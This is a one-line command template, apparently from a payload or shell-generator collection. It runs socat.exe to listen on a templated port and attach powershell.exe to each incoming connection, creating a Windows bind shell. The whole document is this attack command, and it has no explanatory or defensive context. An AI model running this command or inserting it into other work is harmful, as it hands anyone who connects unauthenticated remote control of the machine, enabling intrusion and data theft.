socat.exe tcp-listen:{{ LPORT }},reuseaddr,fork exec:powershell.exe,pipes
